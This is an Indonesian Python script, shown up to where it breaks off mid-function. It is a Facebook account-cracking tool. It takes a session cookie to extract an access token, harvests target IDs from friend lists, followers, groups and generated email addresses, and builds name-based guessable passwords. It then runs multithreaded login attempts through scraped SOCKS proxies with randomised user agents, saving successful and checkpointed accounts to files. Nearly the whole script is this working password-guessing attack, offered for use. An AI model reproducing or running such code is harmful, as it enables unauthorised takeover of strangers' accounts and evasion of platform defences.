#!/usr/bin/python3
# -*- coding: utf-8 -*-

auhtor = '+6281336752461'
nomer = '+62 877737429**'
info_script = 'T.A.797'

###---[ WARNA ]--###
P = "\033[0;00m" #<========= PENGGANTI WARNA TOOLS / TEKS
J = "\x1b[38;5;208m"
S = "\033[0;00m"
N = "\033[38;2;255;127;0;1m"
I = "\033[0;32m"
C = "\033[0;36m"
M = "\033[0;31m"
U = "\033[0;35m"
K = "\33[93m"
Z = "\x1b[1;93m"
P = "\033[00m"
h = "\033[0;90m"
Q = "\033[00m"
kk = "\033[0;32m"
ff = "\033[0;36m"
G = "\033[0;36m"
p = "\033[00m"
h = "\033[0;90m"
Q = "\033[00m"
I = "\033[0;32m"
W = "\033[0;36m"
B = "\033[0;36m"
III = "\033[0;36m"
b = "\033[0;36m"
m = "\033[0;31m"
O = "\033[0;33m"
H = "\033[0;33m"
war = "[•]"
p = '\x1b[0;97m'
m = '\x1b[0;91m'
i = '\x1b[1;92m'
k = '\x1b[1;93m'
b = '\x1b[1;94m'
u = '\x1b[1;95m'
q='\x1b[0m'
c = '\x1b[0;96m'
h = "\x1b[0;90m"
j = "\x1b[38;5;208m"
a = "\x1b[38;5;248m"
o = '\033[38;2;255;127;0;1m'
P = '\033[97m'  # PUTIH
M = '\033[91m' # MERAH
hh = '\033[92m'  # HIJAU
kk = '\033[93m'  # KUNING
bb = '\x1b[1;94m' #BIRU
uu = '\x1b[1;95m' #UNGU
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[0;34m' # BIRU
U = '\x1b[0;35m' # UNGU
O = '\x1b[0;36m' # BIRU MUD
N = '\x1b[0m' # WARNA MATI
BM = '\x1b[0;96m'
###---[ IMPORT MODULE ]---###
import bs4, re, time, requests, datetime, os, sys, random, platform
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import datetime
from time import sleep
import json
import uuid
import hmac
import hashlib
import urllib
import stdiomask
import urllib.request
import calendar
day=datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())
garis = (f" {P}[{bb}+{P}]-----------------------------------------------------------")
insta_log='https://www.instagram.com/accounts/login/?force_classic_login=&'
url='https://www.instagram.com'
USN="Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; MITO A68 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.2.599 U3/0.8.0 Mobile Safari/534.30 Instagram 213.1.0.22.117 (iPhone13,2; iOS 15_0_2; en_US; en-US; scale=3.00; 1170x2532; 332048479)"
menudump=[]
hp = platform.platform()
ses = requests.Session()
s=requests.Session()
try:
	import pyfiglet
except ImportError:
	os.system('pip install pyfiglet')
	import bs4
except ImportError:
	os.system('pip install bs4')


###---[ LOGO ]---###
def logo(n):
	return str(f"""{bb}  
  _______          ______ ___ ______ 
 |__   __|  /\    |____  / _ \____  |
    | |    /  \       / / (_) |  / / 
    | |   / /\ \     / / \__, | / /  
    {M}| |_ / ____ \ _ / /    / / / /   
    |_(_)_/    \_(_)_/    /_/ /_/{P}
    
 Whatsapp {bb}>> {P}{auhtor}
  
 Selamat Datang Di Script {M}> {bb}{info_script}  {P}Script masih dalam pengembangan""")
def logo2():
	return str(f"""{bb}   
  _______          ______ ___ ______ 
 |__   __|  /\    |____  / _ \____  |
    | |    /  \       / / (_) |  / / 
    | |   / /\ \     / / \__, | / /  
    {M}| |_ / ____ \ _ / /    / / / /   
    |_(_)_/    \_(_)_/    /_/ /_/{P}
	
 Auhtor {bb}>> {P}{auhtor}
  
 Selamat Datang Di Script {M}> {bb}{info_script}  {P}Script masih dalam pengembangan""")
 

###---[ TANGGAL ]---###
sasi = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
out = 'Linux-4.9.227-perf+-aarch64-with-libc'
tete = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mai", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
now = datetime.now()
hari = now.day
blx = now.month
try:
	if blx < 0 or blx > 12:exit()
	xx = blx - 1
except ValueError:exit()

bulan = sasi[xx]
tahun = now.year
tanggal = str(hari)+'-'+str(bulan)+'-'+str(tahun)
only_ok = f'OK-{hari}-{bulan}-{tahun}.txt'
only_cp = f'CP-{hari}-{bulan}-{tahun}.txt'
graph = 'graph.facebook.com'

###---[ APPEND ]---###
dump, sandi, metode, mbokey = [], [], [], []
tetel, opsi, proxy = [], [], []
cepeh, sam, redmi_5a = [], [], []
id, id2, loop ,ok , cp = [], [], 0, 0, 0


###---[ CLEAR LAYAR ]---###
def clear_layar():
	try:os.system('clear')
	except:pass
	

###---[ GLOBAL KEMBALI ]---###
def kembali():
	try:open('.cookie.txt','r').read();get_data()
	except IOError:login()
	

###---[ AUTO CREATE UA & PROXY ]---###
try:
	clear_layar()
	print(logo2())
	try:os.remove('.proxy.txt')
	except:pass
	uno = ses.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all').text
	open('.proxy.txt','w').write(uno)
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except requests.exceptions.ConnectionError:
	sys.exit(f" {M}>{P} tidak ada koneksi internet")



for x in range(1500):
	rc = random.choice
	rr = random.randint
	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	A = f'Mozilla/5.0 (Linux; U; Android 12; SM-A135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 OPR/63.0.2254.62069'
	B = f'{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))}'
	C = f'{str(rr(30,57))} Build/{B}) AppleWebKit/537.36 (KHTML, like Gecko)'
	D = f' Version/4.0 Chrome/{str(rr(20,100))}.0.{str(rr(1111,9999))}.80 Mobile Safari/'
	E = f'537.36 HeyTapBrowser/{str(rr(2,40))}.7.36.1'
	F = f'{A}{C}{D}{E}'
	if F in redmi_5a:pass
	else:redmi_5a.append(F)

for x in range(1500):
	rc = random.choice
	rr = random.randint
	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	A = f'Mozilla/5.0 (Linux; U; Android 12; SM-A135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 OPR/63.0.2254.62069'
	B = f'{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))}'
	C = f'{str(rr(30,57))} Build/{B}) AppleWebKit/537.36 (KHTML, like Gecko)'
	D = f' Version/4.0 Chrome/{str(rr(20,100))}.0.{str(rr(1111,9999))}.80 Mobile Safari/'
	E = f'537.36 Opera/{str(rr(2,40))}.7.36.1'
	F = f'{A}{C}{D}{E}'
	if F in redmi_5a:pass
	else:redmi_5a.append(F)

for x in range(2000):
	rc = random.choice
	rr = random.randint
	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	redmi_5a.append(f"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/{str(rc(aZ))}{str(rc(aZ))}{str(rr(111,999))}{str(rc(aZ))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(11,99))}.{str(rr(1,9))}.{str(rr(1111,9999))}.{str(rr(11,99))} Mobile Safari/{str(rc(aZ))}{str(rr(1,9))}{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}")
	redmi_5a.append(f"Mozilla/5.0 (Linux; Android 12; LGE-AN20)/{str(rc(aZ))}{str(rc(aZ))}{str(rr(111,999))}{str(rc(aZ))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(11,99))}.{str(rr(1,9))}.{str(rr(1111,9999))}.{str(rr(11,99))} Mobile Safari/{str(rc(aZ))}{str(rr(1,9))}{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}")
	redmi_5a.append(f'Opera/9.80 (Windows Mobile; Opera Mini/5.1.93975/28.5748; U; in) Presto/2.8.826 Version/11.10')
	redmi_5a.append(f'Mozilla/5.0 (Linux; U; Android 6.0; en-US; A8 MAX Build/MRA58K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.2.960 U3/0.8.0 Mobile Safari/534.30')

	
###---[ CEK COOKIES ]---###
def get_data():
	try:
		coki = open('.cookie.txt','r').read()
		cookiez = {'cookie':coki}
		tokenz = open('.token.txt','r').read()
		n = ses.get(f'https://{graph}/me?access_token={tokenz}',cookies=cookiez).json()['name'].split(' ')[0].lower()
		menu(n,tokenz,cookiez)
	except Exception as e:login()

	
###---[ LOGIN COOKIE ]---###
def login():
	clear_layar()
	print(logo2())
	cookie = input(f"\n {P}[{bb}+{P}]{P} Sangan Di Larang Keras Untuk Menggunakan Akun Pribadi\n {P}[{bb}+{P}] {P}Masukan Cookie :{hh} ")
	url = "https://business.facebook.com/business_locations"
	head = {"user-agent": "Mozilla/5.0 (Linux; U; Android 12; SM-A135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 OPR/63.0.2254.62069","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}
	cok = {'cookie':cookie}
	try:
		data = ses.get(url,headers=head,cookies=cok)
		token = re.search('(EAAG\w+)',data.text).group(1)
		open('.cookie.txt','w').write(cookie)
		open('.token.txt','w').write(token)
		kembali()
	except Exception as e:exit(f" {bb}>{P} cookie invalid silakan cek akun sekarang")

def xxnx():
    try:
        toket = open('licensed.log', 'r').read()
    except IOError:
        print ('\x1b[1;91m License Invalid !')
        os.system('clear')
        os.system('rm -rf licensed.log')
        lisen()
    if os.path.exists('licensed.log'):
        user1()
    else:
        lisen()
def xxnx():
    try:
        toket = open('licensed.log', 'r').read()
    except IOError:
        print('\x1b[1;91m License Invalid !')
        os.system('clear')
        os.system('rm -rf licensed.log')
        lisen()
    if os.path.exists('licensed.log'):
        user1()
    else:
        lisen()

###---[ REMOVE TOKEN & COOKIE ]---###
def remove():
	try:os.remove('.cookie.txt');os.remove('.token.txt')
	except:pass
	
	
	
###---[ MENU UTAMS ]---###
def menu(n,tokenz,cookiez):
	clear_layar()
	print(logo(n)+f'\n')
	print(f" {P}[{bb}+{P}] {hh}01 {P}Ingin Crack Publik ketik (1)")
	print(f" {P}[{bb}+{P}] {hh}02 {P}Ingin Crack Massal ketik (2)")
	print(f" {P}[{bb}+{P}] {hh}03 {P}Ingin Crack Follow ketik (3)")
	print(f" {P}[{bb}+{P}] {hh}04 {P}Ingin Crack Komen ketik (4)")
	print(f" {P}[{bb}+{P}] {hh}05 {P}Ingin Crack Grup ketik (5)")
	print(f" {P}[{bb}+{P}] {hh}06 {P}Ingin Cek akun Crack ketik (6)")
	print(f" {P}[{bb}+{P}] {hh}07 {P}Ingin Cek Opsi Akun ketik (7)")
	print(f" {P}[{bb}+{P}] {hh}08 {P}Ingin crack dari email ??  (8)")
	print(f" {P}[{bb}+{P}] {M}00 {P}Ingin Keluar ketik (0)")
#	print(f" {P}[{bb}+{P}] {hh}07 {P}Ingin Cek Opsi Akun ketik (7)")
	ask = input(f'\n {P}[{bb}+{P}]{P} silahkan ketik :{hh} ')
	if ask in ['1','01']:crack_publik(tokenz,cookiez)
	elif ask in ['2','02']:crack_masal(tokenz,cookiez)
	elif ask in ['3','03']:crack_foll(tokenz,cookiez)
	elif ask in ['4','04']:crack_komen()
	elif ask in ['5','05']:crack_group()
	elif ask in ['6','06']:cek_hasil()
	elif ask in ['7','07']:cek_opsi_cp()
	elif ask in ['8','08']:___nano___email___xyz___()
	elif ask in ['0','00']:remove();exit()
	elif ask in ['',' ',]:sys.exit(f" {P}[{bb}+{P}]{P} Silahkan ketik yang benar")
	else:sys.exit(f" {P}[{bb}+{P}]{P} Silahkan ketik yang benar")


def ___nano___email___xyz___(): #<========= DUMP EMAIL V1
	rc = random.choice
	rr = random.randint
	bas = ["123","232","453","332","jr","225","3488","993","552","332","786","987","098","ganz","716","25","ff","123","456","983","113","331","441","333","666","777","898","987","7676","678","343","543","234","567","789"]
	blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep','ganz','gtg','gege']
	global ok , cp
	print(f"""\n {P}[{bb}+{P}] Dump id dari email
 {P}[{bb}+{P}] Tools ini bersifat cloning maka anda
 {P}[{bb}+{P}] Harus menggunakan secara bijak anda hanya
 {P}[{bb}+{P}] Dapat dump id email max 50000 id""")
	nama = input(f"\n{P}[{K}•{P}] Masukan nama target : {W}")
	if "," in str(nama):
		exit(f"\n {P}[{bb}+{P}] {M}Masukan nama max 1 nama saja ")
	doma = "@yahoo.com"
	if "@" not in str(doma) or ".com" not in str(doma) :
		exit(f"\n {P}[{K}•{P}] {M}Eorr ya anjink babi")
	jumlah = input(f"\n {P}[{bb}+{P}] Masukan max : {W}")
	for xyz in range(int(jumlah)):
		A = nama
		B = [f'{str(rc(bas))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(bas))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(bas))}{str(rc(blk))}']
		C = doma
		D = f'{A}{str(rc(B))}{C}'
		if D in dump:pass
		else:dump.append(D+'|'+nama)
#		print(f"\r{P}[{K}•{P}] Proses dump id {P}[{W}{len(dump)}{P}] {W}<----> {I}%s"%(D),end=''))
		print(f"\r {P}[{bb}+{P}] Proses dump id %s[%s%s%s] %s -> %s%s  "%(P,W,len(dump),P,W,I,D),end=' ')
		sys.stdout.flush()
	atur_atur()
###---[ DETEKSI CHECKPOINT ]---###
detek = []
def cek_opsi_cp():
	nom, no = [], 0
	try:ok = os.listdir('CP')
	except:sys.exit(f"\n {M}>{P} tidak ada hasil cp")
	for x in ok:
		nom.append(x)
		no+=1
		try:jum= open('CP/'+x,'r').readlines()
		except:continue
		print(f' {bb}> {kk}{no}{P} {x} - {kk}{len(jum)} {P}akun')	
	exc = input(f' {bb}> {P} Masukan nomer yang ingin di cek\n\n {bb}> {P}nomor :{hh} ')
	file = nom[int(exc)-1]
	detek.append('file')
	for data in open('CP/'+file,'r').read().splitlines():
		ua = 'Mozilla/5.0 (Linux; Android 11; M2101K7BNY Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/323.0.0.46.119;]'
		try:id,pw = data.split('|')
		except:id,pw,t = data.split('|')[0],data.split('|')[1],data.split('|')[2]
		cek_opsi(id,pw,ua)
	exit(f'\r {bb}>{P} cek opsi checkpoint telah selesai')
	
		
###---[CEK HASIL CRACK ]---###
def cek_hasil():
	no,nom = 0,[]
	one = input(f'\n {bb}> {hh}1{P} cek hasil akun ok\n {bb}> {hh}2{P} cek hasil akun cp\n\n {bb}> {P}Pilih menu (1/2) :{hh} ')
	if one in ['1','01']:
		try:ok = os.listdir('OK')
		except:sys.exit(f"\n {M}>{P} Hasil ok tidak di temukan")
		for x in ok:
			nom.append(x)
			no+=1
			try:jum= open('OK/'+x,'r').readlines()
			except:continue
			print(f' {bb}>> {hh}{no}{P} {x} - {hh}{len(jum)} {P}akun')	
		abc = input(f'\n {bb}>{P} Pilih nomer file :{hh} ')
		file = nom[int(abc)-1]
		try:buka = open('OK/'+file,'r').read()
		except:sys.exit(f"\n {M}>{P} Hasil ok tidak di temukan")
		print(hh+buka+P)
	elif one in ['2','02']:
		try:ok = os.listdir('CP')
		except:sys.exit(f"\n {bb}>{P} file ok tidak di temukan")
		for x in ok:
			nom.append(x)
			no+=1
			try:jum= open('CP/'+x,'r').readlines()
			except:continue
			print(f' {bb}>> {kk}{no}{P}] {x} - {kk}{len(jum)} {P}akun')		
		abc = input(f'\n {bb}>{P} Pilih nomer file :{hh} ')
		file = nom[int(abc)-1]
		try:buka = open('CP/'+file,'r').read()
		except:sys.exit(f"\n {bb}>{P} file cp tidak di temukan")
		print(kk+buka+P)
	else:sys.exit(f"\n {bb}>{P} silahkan ketik yang benar")

	
###---[ DUMP LOGIN ]---###
def crack_publik(tokenz,cookiez):
	print(' ')
	akun = input(f' {P}[{bb}+{P}]{P} Pastikan Akun Yang Anda Masukan Publik \n {P}[{bb}+{P}] {P}Ketik/Tempel Id :{hh} ')
	print(' ')
	try:
		bas = ses.get(f'https://{graph}/{akun}?fields=friends.fields(id,name,username)&access_token={tokenz}',cookies=cookiez).json()
		for pi in bas['friends']['data']:
			try:
				try:dump.append(pi['username']+'|'+pi['name'])
				except:dump.append(pi['id']+'|'+pi['name'])
				print('\r %s[%s>%s] %smohon tunggu ,sedang dump %s id'%(P,bb,P,P,len(dump)),end=" ")
				sys.stdout.flush()
				time.sleep(0.0002)
			except:continue
		atur_atur()
	except (KeyError,IOError):
		exit(f" {M}>>{P} akun tidak publik")	


def crack_masal(tokenz,cookiez):
    print(f'\n {bb}>{P} Pastikan Akun Yang Anda Masukan Publik')
    try:
        bz=0
        apa = int(input(f' {bb}>>{P} jumlah id :{hh} \n'))
    except:apa=1
    for bz in range(apa):
    	bz +=1
    	akun = input(f'\r{bb}> {P}masukan akun ke {bz} : ')
    	try:
    		bas = ses.get(f'https://{graph}/{akun}?fields=friends.fields(id,name,username)&access_token={tokenz}',cookies=cookiez).json()
    		for pi in bas['friends']['data']:
    		      try:dump.append(pi['username']+'|'+pi['name'])
    		      except:dump.append(pi['id']+'|'+pi['name'])
    		      print('\r %s> %sMohon sabar ,sedang dump %s id'%(bb,P,len(dump)),end=" ")
    		      sys.stdout.flush()
    		      time.sleep(0.0002)
    	except:
    		print(f"\r {M}>{P} akun tidak publik       ")
    		continue	                       		
    atur_atur()
    
    
def crack_foll(tokenz,cookiez):
	akun = input(f'\n {bb}>{P} Pastikan Akun Yang Anda Masukan Publik \n {bb}>> {P}Ketik/Tempel Id :{hh} ')
	try:
		bas = ses.get(f"https://{graph}/{akun}?fields=name,subscribers.fields(id,username,name).limit(1000000000)&access_token={tokenz}",cookies=cookiez).json()
		for pi in bas["subscribers"]["data"]:
			try:
				try:dump.append(pi['username']+'|'+pi['name'])
				except:dump.append(pi['id']+'|'+pi['name'])
				print('\r %s> %sMohon sabar ,sedang dump %s id'%(bb,P,len(dump)),end=" ")
				sys.stdout.flush()
				time.sleep(0.0002)
			except:continue
		atur_atur()
	except (KeyError,IOError):
		exit(f"\n {M}>>{P} akun tidak publik")
		
def crack_group():
	link = input(f'\n {bb}>{P} pastikan group yang anda masukan publik \n id/user group : ')
	url = "https://mbasic.facebook.com/groups/"+link
	try:dump_grup(url)
	except KeyboardInterrupt:atur_atur()
	if len(dump)==0:
		exit(f' {M}>>{P} gagal dump group')
	atur_atur()

def dump_grup(url):
	try:
		data = parser(ses.get(url, headers={"user-agent": "Mozilla/5.0 (Linux; U; Android 12; SM-A135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 OPR/63.0.2254.62069"}).text, "html.parser")
		for x in data.find_all("table"):
			par = x.text
			if ">" in par.split(" ") or "mengajukan" in par.split(" "):
				id = re.findall("content_owner_id_new.\w+",str(x))[0].replace("content_owner_id_new.","")
				if " mengajukan pertanyaan ." in par:nama = par.replace(" mengajukan pertanyaan .","")
				else:nama = par.split(" > ")[0]
				if id+"|"+nama in dump:pass
				else:dump.append(id+"|"+nama)
				print(f'\r {P}[{bb}+{P}] {P}Mohon sabar ,sedang dump {len(dump)} id ',end='');sys.stdout.flush()
		for z in data.find_all("a"):
			if "Lihat Postingan Lainnya</span" in str(z).split(">"):
				href = str(z).replace('<a href="','').replace("amp;","").split(" ")[0].replace('"><span>Lihat','')
				dump_grup("https://mbasic.facebook.com"+href)
	except:dump_grup(url)
		
		
###---[ ATUR SEBELUM CRACK ]---###
akunok = []
def atur_atur():
	print(' ')
	ro = input(f' {P}[{bb}+{P}] {hh}1{P} mbasic khusus crack email ketik (1)\n {P}[{bb}+{P}] {hh}2{P} free khusus crack email ketik (2)\n {P}[{bb}+{P}] {hh}3{P} mbasic new ketik (3)\n {P}[{bb}+{P}] {hh}4{P} free new ketik (4)\n\n {P}[{bb}+{P}]{P} ketik metode :{hh} ')
	if ro in ['1','01']:metode.append('mbasic')
	elif ro in ['2','02']:metode.append('free')
	elif ro in ['3','03']:metode.append('mbasic_new')
	elif ro in ['4','04']:metode.append('free_new')
	else:metode.append('mbasic')
	chan = input(f'\n {P}[{bb}+{P}] {hh}1{P} akun tertua ketik (1)\n {P}[{bb}+{P}] {hh}2{P} akun ternew ketik (2)\n {P}[{bb}+{P}] {hh}3{P} akun acak/random ketik (3)\n\n {P}[{bb}+{P}] {P}ketik urutan :{hh} ')
	if chan in ['1','01']:
		for x in dump:
			id.append(x)
	elif chan in ['2','02']:
		for x in dump:
			id.insert(0,x)
	elif chan in ['3','03']:
		for x in dump:
			xx = random.randint(0,len(id))
			id.insert(xx,x)
	else:
		for x in dump:
			id.append(x)
	cp = input(f'\n {P}[{bb}+{P}]{P} tampilan opsi sesi ketik (ya/no)\n\n {P}[{bb}+{P}] {P}pilih  :{hh} ')
	if cp in ['y','Y','ya','Ya','1','01','yy','YA','yA']:
		cepeh.append('ya')
	print(f"\n{P} {P}[{bb}+{P}]{P} Jika Anda Ingin Menampilkan Aplikasi Bisa Mengakibatkan Akun Terkena checkpoint")
	apk = input(f'\n {P}[{bb}+{P}]{P} tampilan info aplikasi ketik (ya/no)\n\n {P}[{bb}+{P}] {P}pilih  :{hh} ')
	if apk in ['y','Ya','ya','1']:akunok.append('apk')
	else:akunok.append('coki')
	ch = input(f'\n {P}[{bb}+{P}] {hh}1{P} manual ketik (1)\n {P}[{bb}+{P}] {hh}2{P} gabung ketik (2)\n {P}[{bb}+{P}] {hh}3{P} auto ketik (3)\n\n ketik kombinasi sandi :{hh} ')
	if ch in ['1','01']:manual()
	elif ch in ['2','2']:gabung()
	elif ch in ['3','03']:otomatis()
	else:otomatis()
	
from datetime import datetime    	
###---[ ATUR SANDI ]---###
def manual():
	global ok,cp
	pwx = []
	B = input(f'\n {bb}>{P} Input sandi manual max 6 kata\n\n {bb}> {P}sandi anda : ').split(',')
	for x in B:
		pwx.append(x)
	print(f'\n {bb}> {P}akun ok di simpan ke : {hh}{only_ok}\n {bb}> {P}akun cp di simpan ke :{kk} {only_cp}\n')
	print(garis)
	awal = datetime.now()
	with tred(max_workers=30) as mbokey:
		for akun in id:
			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
			if 'mobile' in metode:
				mbokey.submit(crack,idf,pwx,"m.facebook.com",awal)
			elif 'mbasic' in metode:
				mbokey.submit(crack,idf,pwx,"mbasic.facebook.com",awal)
			elif 'free' in metode:
				mbokey.submit(crack,idf,pwx,"free.facebook.com",awal)
			else:
				mbokey.submit(crack,idf,pwx,"m.facebook.com",awal)
	sleep(5)
	exit(f'\r {bb}>{P} crack telah selesai jumlah OK:{ok} jumlah CP:{cp} ')


def gabung():
	global ok,cp
	pwx = []
	A = ["123456"]
	B = input(f' {P}[{bb}+{P}]{P} Input sandi manual max 6 kata\n {P}[{bb}+{P}] {P}sandi anda : ').split(',')
	C = input(f' {bb}>{P} Input sandi belakang nama max 1 kata\n {P}[{bb}+{P}] {P}sandi anda : \n')
	if ',' in str(C):
		exit(f" {M}>>{P} sandi belakang {kk}1 {P}kata ")
	print(f'\n {bb}> {P}akun ok di simpan ke : {hh}{only_ok}\n {bb}> {P}akun cp di simpan ke :{kk} {only_cp}\n')
	awal = datetime.now()
	with tred(max_workers=30) as mbokey:
		for akun in id:
			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
			depan = nama.split(" ")[0]
			pwx = A+B
			if len(nama)<=5:
				if len(depan)<=1 or len(depan)<=2:
					pass 
				else:
					pwx.append(depan+"123")
					pwx.append(depan+"12345")
					pwx.append(depan+C)
			else:
				if len(depan)<=1 or len(depan)<=2:
					try:
						tengah = nama.split(" ")[1]
						if len(tengah)<=3:
							pass
						else:
							pwx.append(tengah+"123")
							pwx.append(tengah+"12345")
							pwx.append(tengah+C)
							pwx.append(nama)
					except:
						pwx.append(nama)
				else:
					pwx.append(nama)
					pwx.append(depan+"123")
					pwx.append(depan+"12345")
					pwx.append(depan+C)
			if 'mobile' in metode:
				mbokey.submit(crack,idf,pwx,"m.facebook.com",awal)
			elif 'mbasic' in metode:
				mbokey.submit(crack,idf,pwx,"mbasic.facebook.com",awal)
			elif 'free' in metode:
				mbokey.submit(crack,idf,pwx,"free.facebook.com",awal)
			else:
				mbokey.submit(crack,idf,pwx,"m.facebook.com",awal)
	sleep(5)
	exit(f'\r {bb}>{P} crack telah selesai jumlah OK:{ok} jumlah CP:{cp} ')
				

def otomatis():
	global ok,cp
	tam = input(f' {P}[{bb}+{P}]{P} Input sandi manual max 6 kata\n {P}[{bb}+{P}] {P}sandi anda : ').split(',')
	print(f'\n {P}[{bb}+{P}] {P}akun ok di simpan ke : {hh}{only_ok}\n {P}[{bb}+{P}] {P}akun cp di simpan ke :{kk} {only_cp}\n')
	print(garis)
	print(' ')
	awal = datetime.now()
	with tred(max_workers=30) as mbokey:
		for akun in id:
			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
			depan = nama.split(" ")[0]
			pwx = []
			if len(nama)<=5:
				if len(depan)<=1 or len(depan)<=2:
					pass 
				else:
					pwx.append(depan+"123")
					pwx.append(depan+"12345")
					pwx.append(depan+"1234")
					pwx.append(depan+"1234")
			else:
				if len(depan)<=1 or len(depan)<=2:
					try:
						tengah = nama.split(" ")[1]
						if len(tengah)<=3:
							pass
						else:
							pwx.append(tengah+"123")
							pwx.append(tengah+"12345")
							pwx.append(tengah+"1234")
							pwx.append(tengah+"12")
							pwx.append(nama)
					except:
						try:
							belakang = nama.split(' ')[2]
							if len(belakang)<=3:pass
							else:
								pwx.append(belakang+"123")
								pwx.append(belakang+"1234")
								pwx.append(belakang+"12345")
								pwx.append(belakang+"12")
								pwx.append(nama)
						except:pwx.append(nama)
				else:
					pwx.append(nama)
					pwx.append(depan+"123")
					pwx.append(depan+"12345")
					pwx.append(depan+"1234")
					pwx.append(depan+"12")
			pwx = pwx+tam
			if 'mbasic' in metode:
				mbokey.submit(crack,idf,pwx,"mbasic.facebook.com",awal)
			elif 'free' in metode:
				mbokey.submit(crack,idf,pwx,"m.facebook.com",awal)
			elif 'mbasic_new' in metode:
				mbokey.submit(crack_new,idf,pwx,"mbasic.facebook.com",awal)
			elif 'free_new' in metode:
				mbokey.submit(crack_new,idf,pwx,"m.facebook.com",awal)
			else:
				mbokey.submit(crack,idf,pwx,"mbasic.facebook.com",awal)
	sleep(5)
	exit(f'\r {P}[{bb}+{P}]{P} crack telah selesai jumlah OK:{ok} jumlah CP:{cp} ')
				

###---[ MENU CRACK ]---###
resok = []
rescp = []
def crack(idf,pwx,url,awal):
	global loop,ok,cp
	ses = requests.Session()
	xx = open('.proxy.txt','r').read().splitlines()
	ua = random.choice(redmi_5a)
	ua2 = random.choice(["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36","Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko","Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9","Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4","Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240","Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0","Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko","Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 